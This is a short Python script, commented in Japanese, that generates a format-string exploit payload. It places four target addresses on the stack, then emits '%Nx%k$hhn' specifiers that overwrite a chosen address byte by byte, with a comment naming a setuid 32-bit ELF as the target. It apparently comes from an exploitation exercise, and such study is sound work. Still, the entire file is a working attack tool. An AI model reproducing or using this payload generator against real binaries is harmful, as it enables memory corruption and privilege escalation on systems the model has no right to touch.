#! /usr/bin/env python

import sys
import struct

# 書き込むアドレス:0x080499e0
tgt_addr = int(sys.argv[1], 16)
# 格納する値:0x08048691
dst_addr = int(sys.argv[2], 16)
# 書き込むスタックの開始位置:6
offset = int(sys.argv[3])

code = b""

# address:4bytes <-- setuid ELF 32-bit LSB executable
for i in range(4):
    code += (tgt_addr + i).to_bytes(4, byteorder="little")

dst = dst_addr.to_bytes(4, byteorder="little")
shift = 16

# values
for i in range(len(dst)):
    dst_pos = (dst[i] - shift) % 256
    code += bytes(
        ("%" + str(dst_pos) + "x%" + str(offset + i) + "$hhn").encode("utf-8")
    )
    shift += dst_pos

print(code)
